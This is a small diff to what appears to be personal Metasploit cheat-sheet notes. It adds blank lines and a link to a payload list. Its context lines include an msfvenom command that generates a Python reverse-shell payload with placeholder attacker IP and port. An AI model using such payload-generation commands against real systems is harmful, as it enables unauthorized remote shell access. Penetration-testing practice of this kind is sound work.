@@ -1,5 +1,7 @@
 #metasploit framework
 
+
+
 #generate payload
 
 #in terminal
@@ -29,4 +31,7 @@ exploit
 msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
 
 #it is excrypted to base64. so decode it for getting original code
+
+
+#for more payloads https://netsec.ws/?p=331
 
